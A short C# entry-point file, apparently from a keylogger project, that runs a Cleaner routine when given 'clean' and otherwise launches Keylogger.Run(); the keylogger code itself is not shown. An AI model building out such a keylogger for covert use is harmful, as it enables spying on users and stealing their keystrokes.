using System;

namespace _4_1
{
    class Program
    {
        static void Main(string[] args)
        {
            if (args.Length > 0 && args[0].ToLower() == "clean")
                Cleaner.Run();
            else
                Keylogger.Run();
        }
    }
}
